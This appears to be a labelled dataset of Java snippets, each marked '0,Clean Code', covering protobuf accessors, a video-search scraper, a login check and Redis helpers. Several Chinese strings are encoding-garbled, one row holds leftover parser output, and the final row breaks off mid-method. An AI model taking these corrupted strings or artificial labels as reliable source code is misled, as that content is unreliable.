"@Override public String searchContent(String key,boolean quick){
  try {
    fetchRule();
    if (rule.getSearchUrl().isEmpty()) {
      return """";
    }
    String webUrl=rule.getSearchUrl().replace(""{wd}"",URLEncoder.encode(key));
    String webContent=fetch(webUrl);
    JSONObject result=new JSONObject();
    JSONArray videos=new JSONArray();
    if (rule.getSearchVodNode().startsWith(""json:"")) {
      String[] node=rule.getSearchVodNode().substring(5).split("">"");
      JSONObject data=new JSONObject(webContent);
      for (int i=0; i < node.length; i++) {
        if (i == node.length - 1) {
          JSONArray vodArray=data.getJSONArray(node[i]);
          for (int j=0; j < vodArray.length(); j++) {
            JSONObject vod=vodArray.getJSONObject(j);
            String name=vod.optString(rule.getSearchVodName()).trim();
            name=rule.getSearchVodNameR(name);
            String id=vod.optString(rule.getSearchVodId()).trim();
            id=rule.getSearchVodIdR(id);
            String pic=vod.optString(rule.getSearchVodImg()).trim();
            pic=rule.getSearchVodImgR(pic);
            pic=Misc.fixUrl(webUrl,pic);
            String mark=vod.optString(rule.getSearchVodMark()).trim();
            mark=rule.getSearchVodMarkR(mark);
            JSONObject v=new JSONObject();
            v.put(""vod_id"",id);
            v.put(""vod_name"",name);
            v.put(""vod_pic"",pic);
            v.put(""vod_remarks"",mark);
            videos.put(v);
          }
        }
 else {
          data=data.getJSONObject(node[i]);
        }
      }
    }
 else {
      JXDocument doc=JXDocument.create(webContent);
      List<JXNode> vodNodes=doc.selN(rule.getSearchVodNode());
      for (int i=0; i < vodNodes.size(); i++) {
        String name=vodNodes.get(i).selOne(rule.getSearchVodName()).asString().trim();
        name=rule.getSearchVodNameR(name);
        String id=vodNodes.get(i).selOne(rule.getSearchVodId()).asString().trim();
        id=rule.getSearchVodIdR(id);
        String pic=vodNodes.get(i).selOne(rule.getSearchVodImg()).asString().trim();
        pic=rule.getSearchVodImgR(pic);
        pic=Misc.fixUrl(webUrl,pic);
        String mark="""";
        if (!rule.getCateVodMark().isEmpty()) {
          try {
            mark=vodNodes.get(i).selOne(rule.getSearchVodMark()).asString().trim();
            mark=rule.getSearchVodMarkR(mark);
          }
 catch (          Exception e) {
            SpiderDebug.log(e);
          }
        }
        JSONObject v=new JSONObject();
        v.put(""vod_id"",id);
        v.put(""vod_name"",name);
        v.put(""vod_pic"",pic);
        v.put(""vod_remarks"",mark);
        videos.put(v);
      }
    }
    result.put(""list"",videos);
    return result.toString();
  }
 catch (  Exception e) {
    SpiderDebug.log(e);
  }
  return """";
}",0,Clean Code
"@Override public ServerResponseEntity<UserInfoInTokenBO> getUserInfoInTokenByInputUserNameAndPassword(String inputUserName,String password,Integer sysType){
  if (StrUtil.isBlank(inputUserName)) {
    return ServerResponseEntity.showFailMsg(""鐢ㄦ埛鍚嶄笉鑳戒负绌�"");
  }
  if (StrUtil.isBlank(password)) {
    return ServerResponseEntity.showFailMsg(""瀵嗙爜涓嶈兘涓虹┖"");
  }
  InputUserNameEnum inputUserNameEnum=null;
  if (PrincipalUtil.isUserName(inputUserName)) {
    inputUserNameEnum=InputUserNameEnum.USERNAME;
  }
  if (inputUserNameEnum == null) {
    return ServerResponseEntity.showFailMsg(""璇疯緭鍏ユ纭殑鐢ㄦ埛鍚�"");
  }
  AuthAccountInVerifyBO authAccountInVerifyBO=authAccountMapper.getAuthAccountInVerifyByInputUserName(inputUserNameEnum.value(),inputUserName,sysType);
  if (authAccountInVerifyBO == null) {
    prepareTimingAttackProtection();
    mitigateAgainstTimingAttack(password);
    return ServerResponseEntity.showFailMsg(""鐢ㄦ埛鍚嶆垨瀵嗙爜涓嶆纭�"");
  }
  if (Objects.equals(authAccountInVerifyBO.getStatus(),AuthAccountStatusEnum.DISABLE.value())) {
    return ServerResponseEntity.showFailMsg(""鐢ㄦ埛宸茬鐢紝璇疯仈绯诲鏈�"");
  }
  if (!passwordEncoder.matches(password,authAccountInVerifyBO.getPassword())) {
    return ServerResponseEntity.showFailMsg(""鐢ㄦ埛鍚嶆垨瀵嗙爜涓嶆纭�"");
  }
  return ServerResponseEntity.success(BeanUtil.map(authAccountInVerifyBO,UserInfoInTokenBO.class));
}
",0,Clean Code
"public IntegerWrapper(int initialValue){
  value=initialValue;
}
public IntegerWrapper(){
}
",0,Clean Code
"boolean closing(TabButtonComponent btc);
",0,Clean Code
"public String getOldVersionStr(){
  return this.oldVersionStr;
}
",0,Clean Code
"/** 
 * Pagination query
 * @param param
 * @param selector
 * @return
 */
PageResult<Team> pageQuery(TeamPageQueryParam param,TeamSelector selector);
",0,Clean Code
"@Override public final BattleEndReason forName(final CharSequence value){
  if (value.length() == 22) {
    if (ProtoUtil.isEqual(""BATTLE_END_REASON_NONE"",value)) {
      return BATTLE_END_REASON_NONE;
    }
  }
  if (value.length() == 25) {
    if (ProtoUtil.isEqual(""BATTLE_END_REASON_ALL_DIE"",value)) {
      return BATTLE_END_REASON_ALL_DIE;
    }
  }
  if (value.length() == 28) {
    if (ProtoUtil.isEqual(""BATTLE_END_REASON_TURN_LIMIT"",value)) {
      return BATTLE_END_REASON_TURN_LIMIT;
    }
  }
  return null;
}",0,Clean Code
"/** 
 * <code>optional uint32 index = 4;</code>
 * @return the index
 */
public int getIndex(){
  return index;
}",0,Clean Code
"/** 
 * Create a new chat completion api with default base URL.
 * @param zhiPuAiToken ZhiPuAI apiKey.
 */
public ZhiPuAiApi(String zhiPuAiToken){
  this(ApiUtils.DEFAULT_BASE_URL,zhiPuAiToken);
}
/** 
 * Create a new chat completion api.
 * @param baseUrl api base URL.
 * @param zhiPuAiToken ZhiPuAI apiKey.
 */
public ZhiPuAiApi(String baseUrl,String zhiPuAiToken){
  this(baseUrl,zhiPuAiToken,RestClient.builder());
}
/** 
 * Create a new chat completion api.
 * @param baseUrl api base URL.
 * @param zhiPuAiToken ZhiPuAI apiKey.
 * @param restClientBuilder RestClient builder.
 */
public ZhiPuAiApi(String baseUrl,String zhiPuAiToken,RestClient.Builder restClientBuilder){
  this(baseUrl,zhiPuAiToken,restClientBuilder,RetryUtils.DEFAULT_RESPONSE_ERROR_HANDLER);
}
/** 
 * Create a new chat completion api.
 * @param baseUrl api base URL.
 * @param zhiPuAiToken ZhiPuAI apiKey.
 * @param restClientBuilder RestClient builder.
 * @param responseErrorHandler Response error handler.
 */
public ZhiPuAiApi(String baseUrl,String zhiPuAiToken,RestClient.Builder restClientBuilder,ResponseErrorHandler responseErrorHandler){
  this.restClient=restClientBuilder.baseUrl(baseUrl).defaultHeaders(ApiUtils.getJsonContentHeaders(zhiPuAiToken)).defaultStatusHandler(responseErrorHandler).build();
  this.webClient=WebClient.builder().baseUrl(baseUrl).defaultHeaders(ApiUtils.getJsonContentHeaders(zhiPuAiToken)).build();
}
",0,Clean Code
"/** 
 * <code>optional bool paused = 11;</code>
 * @return whether the paused field is set
 */
public boolean hasPaused(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"/** 
 * Relies upon allLeftIndices being sorted in ascending order. Undefined when it's not.
 * @param allLeftIndices The indices of the left branch.
 * @param buffer The buffer to write out the unused indices to.
 * @return A pair, with the first element the left branch and the second element the right branch.
 */
public Pair<InvertedFeature,InvertedFeature> split(IntArrayContainer allLeftIndices,IntArrayContainer buffer){
  int[] allLeftArray=allLeftIndices.array;
  int allLeftSize=allLeftIndices.size;
  int[] bufferArray=buffer.array;
  if (indices != null) {
    int[] leftIndices=new int[indices.length];
    int leftSize=0;
    int[] rightIndices=new int[indices.length];
    int rightSize=0;
    int bufferIdx=0;
    int curIndex=0;
    int j=0;
    for (int i=0; i < curSize; i++) {
      while ((j < allLeftSize) && ((curIndex=allLeftArray[j]) < indices[i])) {
        bufferArray[bufferIdx]=curIndex;
        bufferIdx++;
        j++;
      }
      if ((j < allLeftSize) && (allLeftArray[j] == indices[i])) {
        leftIndices[leftSize]=indices[i];
        leftSize++;
        j++;
      }
 else {
        rightIndices[rightSize]=indices[i];
        rightSize++;
      }
    }
    if (j < allLeftSize) {
      System.arraycopy(allLeftArray,j,bufferArray,bufferIdx,allLeftSize - j);
    }
    buffer.size=bufferIdx + (allLeftSize - j);
    allLeftIndices.size=0;
    InvertedFeature left, right;
    if (leftSize == 0) {
      left=null;
    }
 else     if (leftSize == 1) {
      left=new InvertedFeature(value,leftIndices[0]);
    }
 else {
      left=new InvertedFeature(value,Arrays.copyOf(leftIndices,leftSize));
    }
    if (rightSize == 0) {
      right=null;
    }
 else     if (rightSize == 1) {
      right=new InvertedFeature(value,rightIndices[0]);
    }
 else {
      right=new InvertedFeature(value,Arrays.copyOf(rightIndices,rightSize));
    }
    return new Pair<>(left,right);
  }
 else {
    boolean found=false;
    int i=0;
    while (!found && i < allLeftSize) {
      if (allLeftArray[i] == index) {
        found=true;
      }
 else {
        i++;
      }
    }
    if (found) {
      System.arraycopy(allLeftArray,0,bufferArray,0,i);
      i++;
      while (i < allLeftSize) {
        bufferArray[i - 1]=allLeftArray[i];
        i++;
      }
      if (i < allLeftSize - 1) {
        System.arraycopy(allLeftArray,i + 1,bufferArray,i,allLeftSize - i);
      }
      buffer.size=allLeftSize - 1;
      allLeftIndices.size=0;
      return new Pair<>(new InvertedFeature(value,index),null);
    }
 else {
      allLeftIndices.array=bufferArray;
      allLeftIndices.size=0;
      buffer.array=allLeftArray;
      buffer.size=allLeftSize;
      return new Pair<>(null,new InvertedFeature(value,index));
    }
  }
}",0,Clean Code
"public String getBlockName(){
  return this.blockName;
}
",0,Clean Code
"/** 
 * @param apiHostValue
 * @return
 */
public BaichuanAIStreamClient.Builder apiHost(String apiHostValue){
  this.apiHost=apiHostValue;
  return this;
}
",0,Clean Code
"/** 
 * 淇濆瓨adminMessage
 * @param adminMessage:绯荤粺娑堟伅琛�
 * @return 淇濆瓨adminMessage
 */
@PostMapping(""/adminMessage/save"") public Result<AdminMessage> save(@RequestBody AdminMessage adminMessage);
",0,Clean Code
"@Override public boolean matches(final ZyGraphNode<? extends CViewNode<?>> node){
  return node.getRawNode().getColor().equals(getColor());
}
",0,Clean Code
"/** 
 * Get the model property: The model name to provide as part of this completions request. Not applicable to Fast Chat AI, where deployment information should be included in the Fast Chat AI resource URI that's connected to.
 * @return the model value.
 */
public String getModel(){
  return this.model;
}
",0,Clean Code
"@Override public void deleteProximityBrowsingNodes(){
  super.deleteProximityBrowsingNodes();
}
",0,Clean Code
"/** 
 * Apply a processed input event. <p> All input events should be supported, including software/hardware events, characters as well as deletions, multiple inputs and gestures.
 * @param event the event to apply. Must not be null.
 */
public void applyProcessedEvent(final Event event){
  applyProcessedEvent(event,false);
}
public void applyProcessedEvent(final Event event,final boolean keepCursorPosition){
  mCombinerChain.applyProcessedEvent(event);
  final int primaryCode=event.getMCodePoint();
  final int keyX=event.getMX();
  final int keyY=event.getMY();
  final int newIndex=size();
  refreshTypedWordCache();
  if (!keepCursorPosition || newIndex == mCodePointSize)   mCursorPositionWithinWord=mCodePointSize;
  if (0 == mCodePointSize) {
    mIsOnlyFirstCharCapitalized=false;
  }
  if (KeyCode.DELETE != event.getMKeyCode()) {
    if (newIndex < MAX_WORD_LENGTH) {
      if (!mIsBatchMode) {
        mInputPointers.addPointerAt(newIndex,keyX,keyY,0,0);
      }
    }
    if (0 == newIndex) {
      mIsOnlyFirstCharCapitalized=Character.isUpperCase(primaryCode);
    }
 else {
      mIsOnlyFirstCharCapitalized=mIsOnlyFirstCharCapitalized && !Character.isUpperCase(primaryCode);
    }
    if (Character.isUpperCase(primaryCode))     mCapsCount++;
    if (Character.isDigit(primaryCode))     mDigitsCount++;
  }
  mAutoCorrection=null;
}",0,Clean Code
"@Override protected void endTyped(VmTyped value,boolean isEmpty){
}
",0,Clean Code
"@Override public void update(World world){
  if (this.mustWaitTurn && !this.isOurTurn)   return;
  if (!this.mustWaitTurn) {
    this.timeSinceLastUpdate++;
    if (this.timeSinceLastUpdate < this.speedInTicks)     return;
  }
  this.timeSinceLastUpdate=0;
  this.isOurTurn=false;
  if (!pinchedByPlayer(world)) {
    BlockPos posHead=this.path.peekFirst();
    BlockPos posTail=this.path.peekLast();
    ArrayList<BlockPos> possibleMovesForward=new ArrayList<BlockPos>();
    ArrayList<BlockPos> possibleMovesBackward=new ArrayList<BlockPos>();
    for (int x=-1; x <= 1; x++) {
      for (int z=-1; z <= 1; z++) {
        if (z != 0 && x != 0)         continue;
        if (z == 0 && x == 0)         continue;
        BlockPos candidateHeadPos=new BlockPos(posHead.getX() + x,posHead.getY(),posHead.getZ() + z);
        BlockPos candidateTailPos=new BlockPos(posTail.getX() + x,posTail.getY(),posTail.getZ() + z);
        if (isValid(world,candidateHeadPos))         possibleMovesForward.add(candidateHeadPos);
        if (isValid(world,candidateTailPos))         possibleMovesBackward.add(candidateTailPos);
      }
    }
    ArrayList<BlockPos> candidates=null;
    boolean forwards=true;
    if (possibleMovesBackward.isEmpty()) {
      candidates=possibleMovesForward;
      forwards=true;
    }
 else     if (possibleMovesForward.isEmpty()) {
      candidates=possibleMovesBackward;
      forwards=false;
    }
 else {
      forwards=this.rng.nextDouble() < 0.5;
      candidates=forwards ? possibleMovesForward : possibleMovesBackward;
    }
    if (!candidates.isEmpty()) {
      BlockDrawingHelper drawContext=new BlockDrawingHelper();
      drawContext.beginDrawing(world);
      BlockPos newPos=candidates.get(this.rng.nextInt(candidates.size()));
      if (forwards) {
        this.originalPath.addFirst(world.getBlockState(newPos));
        drawContext.setBlockState(world,newPos,this.blockType);
        this.path.addFirst(newPos);
        if (this.path.size() > this.pathSize) {
          drawContext.setBlockState(world,posTail,new XMLBlockState(this.originalPath.removeLast()));
          this.path.removeLast();
        }
      }
 else {
        this.originalPath.addLast(world.getBlockState(newPos));
        drawContext.setBlockState(world,newPos,this.blockType);
        this.path.addLast(newPos);
        if (this.path.size() > this.pathSize) {
          drawContext.setBlockState(world,posHead,new XMLBlockState(this.originalPath.removeFirst()));
          this.path.removeFirst();
        }
      }
      drawContext.endDrawing(world);
    }
  }
  if (this.mustWaitTurn) {
    Map<String,String> data=new HashMap<String,String>();
    data.put(""agentname"",this.guid);
    MalmoMod.network.sendToServer(new MalmoMod.MalmoMessage(MalmoMessageType.CLIENT_TURN_TAKEN,0,data));
  }
}",0,Clean Code
"@Override public UnlockBackGroundMusicCsReq clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  unlockIds.clear();
  return this;
}",0,Clean Code
"@Test public void chatCompletionStream(){
  MediaContent anthropicMessage=new MediaContent(""Name 3 famous pirates"");
  ChatCompletionMessage chatCompletionMessage=new ChatCompletionMessage(List.of(anthropicMessage),Role.USER);
  AnthropicChatRequest request=AnthropicChatRequest.builder(List.of(chatCompletionMessage)).withTemperature(0.8f).withMaxTokens(300).withTopK(10).withAnthropicVersion(DEFAULT_ANTHROPIC_VERSION).build();
  Flux<Anthropic3ChatBedrockApi.AnthropicChatStreamingResponse> responseStream=anthropicChatApi.chatCompletionStream(request);
  List<Anthropic3ChatBedrockApi.AnthropicChatStreamingResponse> responses=responseStream.collectList().block();
  assertThat(responses).isNotNull();
  assertThat(responses).hasSizeGreaterThan(10);
  assertThat(responses.stream().filter(message -> message.type() == StreamingType.CONTENT_BLOCK_DELTA).map(message -> message.delta().text()).collect(Collectors.joining())).contains(""Blackbeard"");
}",0,Clean Code
"@Override public String spop(final String key){
  try {
    return redis.spop(key);
  }
 catch (  Exception e) {
    throw new JedisException(e);
  }
}
",0,Clean Code
"public static int getIdentifier(Context ctx,String type,String name,boolean allowSearch){
  if (name == null) {
    return 0;
  }
  if (name.contains(""@"")) {
    String[] arr=name.split(""@"");
    name=arr[arr.length - 1];
  }
  if (type == null && name.contains(""/"")) {
    String[] arr=name.split(""/"");
    type=arr[0];
    name=arr[arr.length - 1];
  }
  try {
    return Integer.parseInt(name);
  }
 catch (  NumberFormatException ignored) {
  }
  if (ctx == null) {
    ctx=HostInfo.getApplication();
  }
  String pkg=ctx.getPackageName();
  int ret=ctx.getResources().getIdentifier(name,type,pkg);
  if (ret != 0) {
    return ret;
  }
  ConfigManager cache=ConfigManager.getCache();
  ret=cache.getIntOrDefault(CACHED_RES_ID_NAME_PREFIX + type + ""/""+ name,0);
  int oldcode=cache.getIntOrDefault(CACHED_RES_ID_CODE_PREFIX + type + ""/""+ name,-1);
  int currcode=HostInfo.getVersionCode32();
  if (ret != 0 && (oldcode == currcode)) {
    return ret;
  }
  if (!allowSearch) {
    return 0;
  }
  ret=enumArsc(pkg,type,name);
  if (ret != 0) {
    cache.putInt(CACHED_RES_ID_NAME_PREFIX + type + ""/""+ name,ret);
    cache.putInt(CACHED_RES_ID_CODE_PREFIX + type + ""/""+ name,currcode);
    cache.save();
  }
  return ret;
}",0,Clean Code
"/** 
 * <code>repeated uint32 finished_main_mission_id_list = 6;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedInt getMutableFinishedMainMissionIdList(){
  bitField0_|=0x00000002;
  return finishedMainMissionIdList;
}",0,Clean Code
"@Override public GroupStateInfo mergeFrom(final GroupStateInfo other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasPlayerUid()) {
    setPlayerUid(other.playerUid);
  }
  if (other.hasGroupState()) {
    setGroupState(other.groupState);
  }
  if (other.hasEntryId()) {
    setEntryId(other.entryId);
  }
  if (other.hasGroupId()) {
    setGroupId(other.groupId);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@2bf2220f!org.eclipse.jdt.core.dom.MethodDeclaration@6d1a01cc",0,Clean Code
"/** 
 * 鍒犻櫎鎵�鏈夌増鏈�
 * @param moduleId
 * @param maxVersion
 */
public static void removeAllVersion(Long moduleId,Integer maxVersion){
  for (Integer i=0; i <= maxVersion; i++) {
    String key=getKey(moduleId,i);
    moduleVersionCache.remove(key);
  }
}",0,Clean Code
"@Override public Content deserialize(JsonElement contentJsonElement,Type ignored,JsonDeserializationContext context){
  String contentTypeString=contentJsonElement.getAsJsonObject().get(CONTENT_TYPE).getAsString();
  ContentType contentType=ContentType.valueOf(contentTypeString);
  return GSON.fromJson(contentJsonElement,contentType.getContentClass());
}
",0,Clean Code
"@Specialization protected VmList eval(VmList self,VmFunction function){
  var builder=self.builder();
  for (  var elem : self) {
    var newValue=applyLambdaNode.execute(function,elem);
    if (newValue instanceof VmNull)     continue;
    builder.add(newValue);
  }
  LoopNode.reportLoopCount(this,self.getLength());
  return builder.build();
}
@Specialization protected VmSet eval(VmSet self,VmFunction function){
  var builder=self.builder();
  for (  var elem : self) {
    var newValue=applyLambdaNode.execute(function,elem);
    if (newValue instanceof VmNull)     continue;
    builder.add(newValue);
  }
  LoopNode.reportLoopCount(this,self.getLength());
  return builder.build();
}
",0,Clean Code
"public boolean tryLock(String key){
  if (StrUtil.isBlank(key)) {
    return false;
  }
  Boolean result=redisTemplate.opsForValue().setIfAbsent(buildKey(key),""lock"",TIMEOUT,TimeUnit.MILLISECONDS);
  return result != null && result;
}
",0,Clean Code
"protected Pair<Period,Long> parsePeriod(XmlPullParser xpp,String baseUrl,long defaultStartMs) throws XmlPullParserException, IOException {
  String id=xpp.getAttributeValue(null,""id"");
  long startMs=parseDuration(xpp,""start"",defaultStartMs);
  long durationMs=parseDuration(xpp,""duration"",C.TIME_UNSET);
  SegmentBase segmentBase=null;
  List<AdaptationSet> adaptationSets=new ArrayList<>();
  List<EventStream> eventStreams=new ArrayList<>();
  boolean seenFirstBaseUrl=false;
  do {
    xpp.next();
    if (XmlPullParserUtil.isStartTag(xpp,""BaseURL"")) {
      if (!seenFirstBaseUrl) {
        baseUrl=parseBaseUrl(xpp,baseUrl);
        seenFirstBaseUrl=true;
      }
    }
 else     if (XmlPullParserUtil.isStartTag(xpp,""AdaptationSet"")) {
      adaptationSets.add(parseAdaptationSet(xpp,baseUrl,segmentBase));
    }
 else     if (XmlPullParserUtil.isStartTag(xpp,""EventStream"")) {
      eventStreams.add(parseEventStream(xpp));
    }
 else     if (XmlPullParserUtil.isStartTag(xpp,""SegmentBase"")) {
      segmentBase=parseSegmentBase(xpp,null);
    }
 else     if (XmlPullParserUtil.isStartTag(xpp,""SegmentList"")) {
      segmentBase=parseSegmentList(xpp,null);
    }
 else     if (XmlPullParserUtil.isStartTag(xpp,""SegmentTemplate"")) {
      segmentBase=parseSegmentTemplate(xpp,null,Collections.emptyList());
    }
 else {
      maybeSkipTag(xpp);
    }
  }
 while (!XmlPullParserUtil.isEndTag(xpp,""Period""));
  return Pair.create(buildPeriod(id,startMs,adaptationSets,eventStreams),durationMs);
}
",0,Clean Code
"/** 
 * <code>repeated .FriendListInfo friend_list = 7;</code> This method returns the internal storage object and sets the corresponding has state. The returned object will become part of this message and its contents may be modified as long as the has state is not cleared.
 * @return internal storage object for modifications
 */
public RepeatedMessage<FriendListInfoOuterClass.FriendListInfo> getMutableFriendList(){
  bitField0_|=0x00000002;
  return friendList;
}",0,Clean Code
"/** 
 * <code>optional double left_sp = 6;</code>
 * @return this
 */
public AvatarProperty clearLeftSp(){
  bitField0_&=~0x00000020;
  leftSp=0D;
  return this;
}",0,Clean Code
"@Override public void setY2(final double y2){
}",0,Clean Code
"/** 
 * @deprecated If you want to continue using sync client, use {@link AzureOpenAiChatModel} instead.
 * @param useAsyncClient {@code true} if you want to use the async client, {@code false} if you want to use the sync client.
 * @return builder with the useAsyncClient parameter set
 */
@SuppressWarnings(""DeprecatedIsStillUsed"") @Deprecated public Builder useAsyncClient(boolean useAsyncClient){
  this.useAsyncClient=useAsyncClient;
  return this;
}
",0,Clean Code
"public float set(float mustBe){
  return this.set(mustBe,false);
}
public float set(float mustBe,boolean force){
  if (force || transitionDuration <= 0 || firstSet) {
    value=targetValue=mustBe;
    transition=false;
    firstSet=false;
  }
 else   if (Math.abs(targetValue - mustBe) > 0.0001f) {
    transition=true;
    targetValue=mustBe;
    startValue=value;
    transitionStart=SystemClock.elapsedRealtime();
  }
  if (transition) {
    final long now=SystemClock.elapsedRealtime();
    final float t=MathUtils.clamp((now - transitionStart - transitionDelay) / (float)transitionDuration,0,1);
    if (now - transitionStart >= transitionDelay) {
      if (transitionInterpolator == null) {
        value=AndroidUtilities.lerp(startValue,targetValue,t);
      }
 else {
        value=AndroidUtilities.lerp(startValue,targetValue,transitionInterpolator.getInterpolation(t));
      }
    }
    if (t >= 1f) {
      transition=false;
    }
 else {
      if (parent != null) {
        parent.invalidate();
      }
      if (invalidate != null) {
        invalidate.run();
      }
    }
  }
  return value;
}",0,Clean Code
"Color getFillColor();
",0,Clean Code
"public Map<String,Project> getLocalProjectDependencies(){
  return localProjectDependencies;
}
",0,Clean Code
"@Override public String toString(){
  return ""BinaryQuantization"";
}
",0,Clean Code
"public String getFinalizeQueue(){
  return finalizeQueue;
}
",0,Clean Code
"@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitWhere(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitNinExpression(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitAndExpression(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitInExpression(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitNotExpression(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitCompareExpression(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitOrExpression(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitGroupExpression(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitConstantArray(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitCompare(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitIdentifier(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitDecimalConstant(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitTextConstant(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitBooleanConstant(this);
}
@Override public void exitRule(ParseTreeListener listener){
  if (listener instanceof FiltersListener)   ((FiltersListener)listener).exitIntegerConstant(this);
}
",0,Clean Code
"public String toString(){
  return ""GProGetRecommendQuickJoinRsp{recommendQuickJoinItems="" + this.recommendQuickJoinItems + "",}"";
}
",0,Clean Code
"/** 
 * Create a vector from the given data.
 * @param data the data to create the vector from. Supported data types are implementation-dependent.
 * @return the created vector.
 */
VectorFloat<?> createFloatVector(Object data);
/** 
 * Create a zero-filled vector of the given length.
 * @param length the length of the vector to create.
 * @return the created vector.
 */
VectorFloat<?> createFloatVector(int length);
",0,Clean Code
"public long getSeq(){
  return this.seq;
}
",0,Clean Code
"/** 
 * <code>optional uint32 cur_site_id = 15;</code>
 * @return this
 */
public EnterRogueMapRoomScRsp clearCurSiteId(){
  bitField0_&=~0x00000002;
  curSiteId=0;
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 2;</code>
 * @param value the retcode to set
 * @return this
 */
public ChessRogueSelectCellScRsp setRetcode(final int value){
  bitField0_|=0x00000001;
  retcode=value;
  return this;
}",0,Clean Code
"public ConcurrentHashMapSerializer(Fury fury,Class<ConcurrentHashMap> type){
  super(fury,type,true);
}
",0,Clean Code
"/** 
 * <pre> 鍏徃ID </pre> <code>uint64 companyId = 7;</code>
 * @param value The companyId to set.
 * @return This builder for chaining.
 */
public Builder setCompanyId(long value){
  companyId_=value;
  onChanged();
  return this;
}",0,Clean Code
"public WorkflowBuilder<T> version(int version){
  this.version=version;
  return this;
}
",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeEnumSizeNoTag(status);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(rogueMiracleInfo);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(rogueAeonInfo);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(rogueAvatarInfo);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(pendingAction);
  }
  if ((bitField0_ & 0x00000020) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(roomMap);
  }
  if ((bitField0_ & 0x00000040) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(rogueVirtualItem);
  }
  if ((bitField0_ & 0x00000080) != 0) {
    size+=1 + ProtoSink.computeMessageSizeNoTag(rogueBuffInfo);
  }
  return size;
}",0,Clean Code
"public String getIndexName(){
  return this.indexName;
}
",0,Clean Code
"private static void resolveAppName(){
  appName=System.getProperty(""project.name"");
  if (appName != null && !appName.isEmpty()) {
    return;
  }
  appName=System.getProperty(""spring.application.name"");
  if (appName != null && !appName.isEmpty()) {
    return;
  }
  String command=System.getProperty(""sun.java.command"");
  if (command == null || command.isEmpty()) {
    return;
  }
  command=command.split(""\\s"")[0];
  String separator=File.separator;
  if (command.contains(separator)) {
    String[] strs;
    if (""\\"".equals(separator)) {
      strs=command.split(""\\\\"");
    }
 else {
      strs=command.split(separator);
    }
    command=strs[strs.length - 1];
  }
  if (command.toLowerCase().endsWith("".jar"")) {
    command=command.substring(0,command.length() - 4);
  }
  appName=command;
}",0,Clean Code
"@Test(expected=ConductorClientException.class) public void testEmptyCreateWorkflowDef(){
  try {
    WorkflowDef workflowDef=new WorkflowDef();
    metadataClient.registerWorkflowDef(workflowDef);
  }
 catch (  ConductorClientException e) {
    assertEquals(400,e.getStatus());
    assertEquals(""Validation failed, check below errors for detail."",e.getMessage());
    assertFalse(e.isRetryable());
    List<ValidationError> errors=e.getValidationErrors();
    List<String> errorMessages=errors.stream().map(ValidationError::getMessage).collect(Collectors.toList());
    assertTrue(errorMessages.contains(""WorkflowDef name cannot be null or empty""));
    assertTrue(errorMessages.contains(""WorkflowTask list cannot be empty""));
    throw e;
  }
}",0,Clean Code
"/** 
 * 杩斿洖 key 鎵�鍌ㄥ瓨鐨勫�肩殑绫诲瀷
 * @param key key
 * @return DataType
 */
DataType getType(String key);
",0,Clean Code
"/** 
 * <code>optional string text = 2;</code>
 * @return internal {@code Utf8String} representation of text for modifications
 */
public Utf8String getMutableTextBytes(){
  bitField0_|=0x00000008;
  return this.text;
}",0,Clean Code
"public MySQLExecutionDAO(RetryTemplate retryTemplate,ObjectMapper objectMapper,DataSource dataSource){
  super(retryTemplate,objectMapper,dataSource);
}
",0,Clean Code
"@Override protected void endDynamic(VmDynamic value,boolean isEmpty){
  if (value.hasElements()) {
    endYamlSequence(isEmpty);
  }
 else {
    endYamlMapping(isEmpty);
  }
}
",0,Clean Code
"public static List<Long> getDateRegion(long startTime,long endTime,String cycleUnit){
  List<Long> ret=new ArrayList<Long>();
  DateTime dtStart=DateTime.forInstant(startTime,TimeZone.getDefault());
  DateTime dtEnd=DateTime.forInstant(endTime,TimeZone.getDefault());
  if (cycleUnit.equals(""M"")) {
    dtEnd=dtEnd.getEndOfMonth();
  }
 else   if (cycleUnit.equals(""D"")) {
    dtEnd=dtEnd.getEndOfDay();
  }
  int year=0;
